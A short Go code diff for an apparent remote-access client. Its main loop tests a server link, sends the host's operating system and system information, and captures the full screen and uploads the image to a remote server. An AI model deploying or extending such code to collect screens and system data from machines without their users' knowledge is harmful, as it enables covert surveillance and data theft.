@@ -12,7 +12,7 @@ import (
 )
 
 // Whether the server is being connected
-var GIsLinkingWithServer = false
+var GIsLinkingWithServer = true
 
 //Post("http://xxxx","application/json;charset=utf-8",[]byte("{'aaa':'bbb'}"))
 func Post(url string, contentType string, body []byte) (string, error) {
@@ -36,7 +36,6 @@ func main() {
 		shared.TASK_SYSTEMINFO,
 		shared.TASK_CAPTURESCREEN}...,
 	)
-
 	for GIsLinkingWithServer {
 		if len(taskAry) > 0 {
 			task := taskAry[0]
@@ -46,7 +45,7 @@ func main() {
 				GIsLinkingWithServer = remote.TestServerLink()
 			case shared.TASK_SYSTEMINFO:
 				osid, osName := runtime.GetSystem()
-				remote.SendMsg(fmt.Sprintf("操作系统：%s\n", osName))
+				remote.SendMsg(fmt.Sprintf("操作系统：%s", osName))
 				remote.SendMsg(runtime.GetSystemInfo(osid))
 			case shared.TASK_CAPTURESCREEN:
 				filename := remote.CaptureFullScreen()
@@ -55,6 +54,7 @@ func main() {
 				// 发送文件
 				remote.SendFile(filename)
 				remote.GConn.Close()
+				fmt.Println("发送截图：" + "screen_" + filename + "_" + filesize)
 			}
 		}
 	}
